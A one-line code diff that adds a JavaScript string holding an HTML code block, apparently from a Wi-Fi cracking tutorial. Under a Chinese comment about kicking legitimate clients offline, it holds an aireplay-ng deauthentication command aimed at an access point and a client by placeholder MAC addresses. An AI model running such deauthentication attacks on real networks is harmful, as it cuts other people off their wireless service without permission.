@@ -1,0 +1,1 @@
+var __v="\u003cpre class=\"k-pre\"\u003e//将合法客户踢下线 \naireplay-ng -0 10 -a AP的mac -c 客户机的mac mon0  \n\u003c/pre\u003e"
